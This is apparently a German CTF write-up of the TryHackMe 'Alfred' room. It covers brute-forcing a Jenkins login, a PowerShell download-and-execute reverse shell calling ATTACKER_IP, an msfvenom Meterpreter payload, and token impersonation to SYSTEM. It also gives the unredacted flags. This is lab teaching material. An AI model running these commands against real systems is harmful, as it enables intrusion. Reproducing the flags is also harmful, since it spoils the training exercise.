---
title: "Alfred Writeup"
date: 2023-06-13
tags: [writeup, ctf, tryhackme]
description: "Bruteforcen eines Jenkins-Logins mit Burp Intruder, gefolgt von einer PowerShell-Reverse-Shell und einer Token-Impersonation-Privesc im Alfred-Room auf TryHackMe."
---

Hey!

Bevor du weitermachst, wollte ich nur kurz sagen: Wenn du noch Anfänger bist, NUTZE DIESES WRITEUP NICHT ALS BEQUEME ABKÜRZUNG. Geh lieber noch mal zu den vorherigen Trainings-/Info-Rooms zurück, schau dir die an und probiere den Room dann selbst aus. Ich habe die Antworten angegeben und die Flags sind _nicht geschwärzt_. Das bedeutet aber nicht, dass du sie einfach kopieren und einfügen und Feierabend machen solltest. Nutze das hier wirklich nur dann, wenn du komplett feststeckst und nicht mehr weiterkommst.

In diesem Sinne: Ich hoffe, es hilft weiter 😄

## Setup 

Zuerst müssen wir uns mit dem TryHackMe-VPN-Server verbinden. Mehr Infos dazu findest du auf der [Access](https://tryhackme.com/access)-Seite.

Ich benutze openvpn, um mich mit dem Server zu verbinden. Hier ist der Befehl:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Ein schneller `nmap`-Scan liefert uns schon ein paar nützliche Details:
```shell-session
$ sudo nmap -sS -vv -Pn --top-ports 2000 -oN nmap_scan.txt TARGET_IP

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
8080/tcp open  http-proxy    syn-ack ttl 127
```

> How many ports are open? (TCP only)
>
> Answer: 3

OS Fingerprinting, um einen passenden Angriffsvektor zu finden:
```shell-session
$ sudo nmap -O -Pn -vv TARGET_IP
...
...
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
```

Wir können uns ziemlich sicher sein, dass auf dem Server irgendein Windows-Betriebssystem läuft. Auf Port 80 läuft ein HTTP-Server und auf Port 8080 ein Proxy. Wenn wir die Seite auf Port 80 aufrufen, sehen wir:
![Port 80 web-page](/assets/img/writeup_assets/alfred/port-80-page.png)

Wenn wir die Seite auf Port 8080 besuchen, begrüßt uns Folgendes:
![Port 8080 page](/assets/img/writeup_assets/alfred/port-8080-login.png)

Die Webseite ist ein Login-Portal. Wir können `hydra` oder den Burp Suite Intruder nutzen, um das Ganze per Brute-Force anzugreifen und an Zugangsdaten zu kommen.

Ich verwende Burp Suite, um einen Sniper-Angriff zu starten und Credentials abzugreifen...
![Burpsuite Intruder Attack](/assets/img/writeup_assets/alfred/burp-intruder.png)
![Sniper Attack](/assets/img/writeup_assets/alfred/sniper-attack.png)



Wir können jetzt versuchen, uns mit den gefundenen Zugangsdaten im Portal anzumelden.

> What is the username and password for the log in panel(in the format username:password)
>
> Answer: `admin:admin`


## Gaining Access

Sobald wir eingeloggt sind, sehen wir ein Dashboard, über das der Benutzer allerhand Dinge tun kann.
![Dashboard](/assets/img/writeup_assets/alfred/dashboard.png)

Mit der Funktion `New Item` auf dem Dashboard können wir nun eine Payload hochladen, die ausgeführt wird, um uns Zugriff über eine Reverse Shell zu verschaffen. Dafür brauchen wir zunächst eine Reverse-TCP-Shell, die PowerShell nutzt. Wie der Room in seiner ersten Aufgabe vorgibt, sollen wir dafür `nishang` für dieses PowerShell-Skript verwenden.

```shell-session
$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

Sobald wir die Shell haben, können wir mit dem `NewItem`-Tool die Datei hochladen und den Server folgenden Befehl ausführen lassen:
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
```

![](/assets/img/writeup_assets/alfred/initial-access-1.png)

Nachdem das Projekt erstellt wurde, werden wir zum Konfigurationsbereich weitergeleitet, wo wir dem Workflow vorgeben können, den zuvor erwähnten Befehl auszuführen:

![](/assets/img/writeup_assets/alfred/initial-access-2.png)

Bevor es weitergeht, müssen wir auf unserem Rechner einen HTTP-Server starten, damit sich der Remote-Server verbinden und das PowerShell-Skript herunterladen kann.
***HINWEIS***: Die Skriptdatei muss im aktuellen Arbeitsverzeichnis liegen, damit das funktioniert.

```shell-session
$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

Außerdem müssen wir einen Listener für die Reverse Shell starten:
```shell-session
$ nc -nvlp 4445
```

Nachdem das alles erledigt ist, können wir den Workflow endlich ausführen, indem wir links im Projektmenü auf `Build Now` klicken. Dadurch erhalten wir eine Shell, mit der wir arbeiten können:
```shell-session
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\alfred> cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```

Wir haben uns erfolgreich die User-Flag geholt – jetzt können wir uns an die Privilege Escalation machen.

> What is the user.txt flag? 
>
> Answer: `79007a09481963edf2e1321abd9ae2a0`

## Privilege Escalation

Um es uns etwas einfacher zu machen, nutzen wir für die Privilege Escalation eine Meterpreter-Shell. Zuerst müssen wir eine Payload für eine Reverse Shell generieren:
```shell-session
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
```
Wir brauchen einen Listener auf unserer Maschine:
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
LHOST => ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT PORT
LPORT => PORT

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on ATTACKER_IP:PORT
```


Wir laden sie auf die Maschine hoch, indem wir in der Konfiguration des Projekts einen Build-Schritt hinzufügen:
```powershell
powershell iex "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER_IP:PORT/shell.exe','shell.exe')"
```

Wenn wir das Projekt bauen, erhalten wir wieder die vorherige Shell, in der wir den folgenden Befehl ausführen können:
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\alfred> Start-Process shell.exe
```

Dadurch wird die Meterpreter-Shell gestartet.


> What is the final size of the exe payload that you generated?
>
> Answer: `73802`

Jetzt, wo wir eine schicke Meterpreter-Shell haben, können wir nachsehen, welche Rechte wir eigentlich haben:
```shell-session
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

Als Benutzer `alfred` haben wir die Berechtigungen `SeDebugPrivilege`, `SeImpersonatePrivilege` und `SeCreateGlobalPrivilege` aktiviert. Wir laden das `incognito`-Modul und können es dann nutzen, um die Tokens aufzulisten:

```shell-session
PS > ^C
Terminate channel 1? [y/N]  y                                                             
meterpreter > load incognito                                                              
Loading extension incognito...Success.                                                    
meterpreter > list_tokens -g                                                              
[-] Warning: Not currently running as SYSTEM, not all tokens will be available            
             Call rev2self if primary process token is SYSTEM                             
                                                                                          
Delegation Tokens Available                                                               
========================================                                                  
\                                                                                         
BUILTIN\Administrators                                                                    
BUILTIN\IIS_IUSRS                                                                         
BUILTIN\Users                                                                             
NT AUTHORITY\Authenticated Users                                                          
NT AUTHORITY\NTLM Authentication                                                          
NT AUTHORITY\SERVICE                                                                      
NT AUTHORITY\This Organization                                                            
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\swprv
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\VSS
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

Da das Token `BUILTIN\Administrators` verfügbar ist, können wir mit folgendem Befehl die Identität des Admin-Tokens annehmen (impersonate):
```shell-session
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

Mit dem Befehl `getuid` können wir bestätigen, dass wir jetzt Admin-Rechte haben:
```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> What is the output when you run the getuid command?
>
> Answer: `NT AUTHORITY\SYSTEM`

Wie in der Aufgabe empfohlen, migrieren wir nun diesen Prozess:
```shell-session
meterpreter > ps
...

668   580   services.exe   x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\se
                                                                  rvices.exe
...

meterpreter > migrate 668
[*] Migrating from 2176 to 668...
[*] Migration completed successfully.
meterpreter > cat "C:\Windows\System32\config\root.txt" 
��dff0f748678f280250f25a45b8046b4a
```

> read the root.txt file at `C:\Windows\System32\config`
>
> Answer: `dff0f748678f280250f25a45b8046b4a`

## Conclusion

Wenn dir dieses Writeup geholfen hat, folge mir gerne auf [GitHub](https://github.com/NovusEdge) und/oder lass ein Sternchen auf dem Repository da: https://github.com/NovusEdge/thm-writeups


- Room: [Alfred](https://tryhackme.com/room/alfred)
